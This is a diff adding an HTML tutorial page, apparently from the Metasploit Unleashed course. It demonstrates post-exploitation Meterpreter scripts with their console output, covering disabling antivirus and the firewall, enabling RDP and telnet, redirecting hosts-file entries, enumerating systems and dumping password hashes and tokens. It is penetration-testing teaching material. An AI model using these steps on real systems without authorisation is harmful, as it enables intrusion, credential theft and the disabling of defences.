@@ -1,0 +1,109 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>Existing Scripts</title>
+</head>
+<body>
+<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Existing
+Scripts</h1>
+<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
+- Mastering The Framework</h3>
+<p style="color: rgb(0, 0, 0);">Metasploit comes with a ton of useful
+scripts that can aid you in
+the Metasploit Framework. These scripts are typically made by third
+parties and eventually adopted into the subversion repository. We'll
+run through some of them and walk you through how you can use them in
+your own penetration test.
+</p>
+<p style="color: rgb(0, 0, 0);">The scripts mentioned below are
+intended to be used with a
+Meterpreter shell after the successful compromise of a target. Once you
+have gained a session with the target you can utilize these scripts to
+best suit your needs.
+</p>
+<p style="color: rgb(0, 0, 0);">The 'checkvm' script, as its name
+suggests, checks to see if
+you exploited a virtual machine. This information can be very useful.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);"> <u>meterpreter</u> &gt; run checkvm  <br> <br> [*] Checking if SSHACKTHISBOX-0 is a Virtual Machine ........<br> [*] This is a VMware Workstation/Fusion Virtual Machine</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);"> The 'getcountermeasure' script
+checks the security configuration
+on the victims system and can disable other security measures such as
+A/V, Firewall, and much more.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);"> <u>meterpreter</u> &gt; run getcountermeasure <br> <br> [*] Running Getcountermeasure on the target... <br> [*] Checking for contermeasures...<br> [*] Getting Windows Built in Firewall configuration...<br> [*]    <br> [*]     Domain profile configuration:<br> [*]     -------------------------------------------------------------------<br> [*]     Operational mode                  = Disable<br> [*]     Exception mode                    = Enable<br> [*]    <br> [*]     Standard profile configuration:<br> [*]     -------------------------------------------------------------------<br> [*]     Operational mode                  = Disable<br> [*]     Exception mode                    = Enable<br> [*]    <br> [*]     Local Area Connection 6 firewall configuration:<br> [*]     -------------------------------------------------------------------<br> [*]     Operational mode                  = Disable<br> [*]    <br> [*] Checking DEP Support Policy...</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);"> The 'getgui' script is used to
+enable RDP on a target system if it is disabled.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);"> <u>meterpreter</u> &gt; run getgui <br> <br> Windows Remote Desktop Enabler Meterpreter Script<br> Usage: getgui -u  -p<br><br> <br> OPTIONS:<br> <br> -e   Enable RDP only.<br> -h   Help menu.<br> -p   The Password of the user to add.<br> -u   The Username of the user to add.<br> <br> <u>meterpreter</u> &gt; run getgui -e<br> <br> [*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator<br> [*] Carlos Perez carlos_perez@darkoperator.com<br> [*] Enabling Remote Desktop<br> [*] RDP is already enabled<br> [*] Setting Terminal Services service startup mode<br> [*] Terminal Services service is already set to auto<br> [*] Opening port in local firewall if necessary</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);"> The 'gettelnet' script is used to
+enable telnet on the victim if it is disabled.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);"> <u>meterpreter</u> &gt; run gettelnet <br> <br> Windows Telnet Server Enabler Meterpreter Script<br> Usage: gettelnet -u  -p<br><br> <br> OPTIONS:<br> <br> -e   Enable Telnet Server only.<br> -h   Help menu.<br> -p   The Password of the user to add.<br> -u   The Username of the user to add.<br> <br> <u>meterpreter</u> &gt; run gettelnet -e<br> <br> [*] Windows Telnet Server Enabler Meterpreter Script<br> [*] Setting Telnet Server Services service startup mode<br> [*] The Telnet Server Services service is not set to auto, changing it to auto ...<br> [*] Opening port in local firewall if necessary</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);"> The 'killav' script can be used to
+disable most antivirus programs running as a service on a target.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);"> <u>meterpreter</u> &gt; run killav <br> <br> [*] Killing Antivirus services on the target...<br> [*] Killing off cmd.exe...</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);"> The 'get_local_subnets' script is
+used to get the local subnet
+mask of a victim. This can be very useful information to have for
+pivoting.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);"> <u>meterpreter</u> &gt; run get_local_subnets <br> <br> Local subnet: 10.211.55.0/255.255.255.0</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);"> The 'hostsedit' Meterpreter script
+is for adding entries to the
+Windows hosts file. Since Windows will check the hosts file first
+instead of the configured DNS server, it will assist in diverting
+traffic to a fake entry or entries. Either a single entry can be
+provided or a series of entries can be provided with a file containing
+one entry per line.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; run hostsedit <br> <br> OPTIONS:<br> <br> -e   Host entry in the format of IP,Hostname.<br> -h   Help Options.<br> -l   Text file with list of entries in the format of IP,Hostname. One per line.<br> <br> Example:<br> <br> run hostsedit -e 127.0.0.1,google.com<br> run hostsedit -l /tmp/fakednsentries.txt<br> <br> <u>meterpreter</u> &gt; run hostsedit -e 10.211.55.162,www.microsoft.com<br> [*] Making Backup of the hosts file.<br> [*] Backup loacated in C:\WINDOWS\System32\drivers\etc\hosts62497.back<br> [*] Adding Record for Host www.microsoft.com with IP 10.211.55.162<br> [*] Clearing the DNS Cache</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);"> The 'remotewinenum' script will
+enumerate system information through wmic on victim. Make note of where
+the logs are stored.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; run remotewinenum<br> <br> Remote Windows Enumeration Meterpreter Script<br> This script will enumerate windows hosts in the target environment<br> given a username and password or using the credential under witch<br> Meterpreter is running using WMI wmic windows native tool.<br> Usage:<br> <br> OPTIONS:<br> <br> -h   Help menu.<br> -p   Password of user on target system<br> -t   The target address<br> -u   User on the target system (If not provided it will use credential of process)<br> <br> <u>meterpreter</u> &gt; run remotewinenum -u administrator -p ihazpassword -t 10.211.55.128<br> <br> [*] Saving report to /root/.msf3/logs/remotewinenum/10.211.55.128_20090711.0142 <br> [*] Running WMIC Commands ....<br> [*]     running command wimic environment list<br> [*]     running command wimic share list<br> [*]     running command wimic nicconfig list<br> [*]     running command wimic computersystem list<br> [*]     running command wimic useraccount list<br> [*]     running command wimic group list<br> [*]     running command wimic sysaccount list<br> [*]     running command wimic volume list brief<br> [*]     running command wimic logicaldisk get description,filesystem,name,size<br> [*]     running command wimic netlogin get name,lastlogon,badpasswordcount<br> [*]     running command wimic netclient list brief<br> [*]     running command wimic netuse get name,username,connectiontype,localname<br> [*]     running command wimic share get name,path<br> [*]     running command wimic nteventlog get path,filename,writeable<br> [*]     running command wimic service list brief<br> [*]     running command wimic process list brief<br> [*]     running command wimic startup list full<br> [*]     running command wimic rdtoggle list<br> [*]     running command wimic product get name,version<br> [*]     running command wimic qfe list</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);"> The 'winenum' script makes for a
+very detailed windows enumeration tool. It dumps tokens, hashes and
+much more.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; run winenum <br> <br> [*] Running Windows Local Enumerion Meterpreter Script<br> [*] New session on 10.211.55.128:4444...<br> [*] Saving report to /root/.msf3/logs/winenum/10.211.55.128_20090711.0514-99271/10.211.55.128_20090711.0514-99271.txt<br> [*] Checking if SSHACKTHISBOX-0 is a Virtual Machine ........<br> [*]     This is a VMware Workstation/Fusion Virtual Machine <br> [*] Running Command List ...<br> [*]     running command cmd.exe /c set<br> [*]     running command arp -a<br> [*]     running command ipconfig /all<br> [*]     running command ipconfig /displaydns<br> [*]     running command route print<br> [*]     running command net view<br> [*]     running command netstat -nao<br> [*]     running command netstat -vb<br> [*]     running command netstat -ns<br> [*]     running command net accounts<br> [*]     running command net accounts /domain<br> [*]     running command net session<br> [*]     running command net share<br> [*]     running command net group<br> [*]     running command net user<br> [*]     running command net localgroup<br> [*]     running command net localgroup administrators<br> [*]     running command net group administrators<br> [*]     running command net view /domain<br> [*]     running command netsh firewall show config<br> [*]     running command tasklist /svc<br> [*]     running command tasklist /m<br> [*]     running command gpresult /SCOPE COMPUTER /Z<br> [*]     running command gpresult /SCOPE USER /Z<br> [*] Running WMIC Commands ....<br> [*]     running command wmic computersystem list brief<br> [*]     running command wmic useraccount list<br> [*]     running command wmic group list<br> [*]     running command wmic service list brief<br> [*]     running command wmic volume list brief<br> [*]     running command wmic logicaldisk get description,filesystem,name,size<br> [*]     running command wmic netlogin get name,lastlogon,badpasswordcount<br> [*]     running command wmic netclient list brief<br> [*]     running command wmic netuse get name,username,connectiontype,localname<br> [*]     running command wmic share get name,path<br> [*]     running command wmic nteventlog get path,filename,writeable<br> [*]     running command wmic process list brief<br> [*]     running command wmic startup list full<br> [*]     running command wmic rdtoggle list<br> [*]     running command wmic product get name,version<br> [*]     running command wmic qfe<br> [*] Extracting software list from registry<br> [*] Finished Extraction of software list from registry<br> [*] Dumping password hashes...<br> [*] Hashes Dumped<br> [*] Getting Tokens...<br> [*] All tokens have been processed<br> [*] Done!</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);"> The 'scraper' script can grab even
+more system information, including the entire registry.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; run scraper<br> <br> [*] New session on 10.211.55.128:4444...<br> [*] Gathering basic system information...<br> [*] Dumping password hashes...<br> [*] Obtaining the entire registry...<br> [*] Exporting HKCU<br> [*] Downloading HKCU (C:\WINDOWS\TEMP\LQTEhIqo.reg)<br> [*] Cleaning HKCU<br> [*] Exporting HKLM<br> [*] Downloading HKLM (C:\WINDOWS\TEMP\GHMUdVWt.reg)</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);"> From our examples above we can see
+that there are plenty of
+Meterpreter scripts for us to enumerate a ton of information, disable
+anti-virus for us, enable RDP, and much much more.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<div style="text-align: center; color: rgb(0, 0, 0);"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/Meterpreter_Scripting"
+ title="Meterpreter Scripting">Meterpreter Scripting</a></div>
+</body>
+</html>
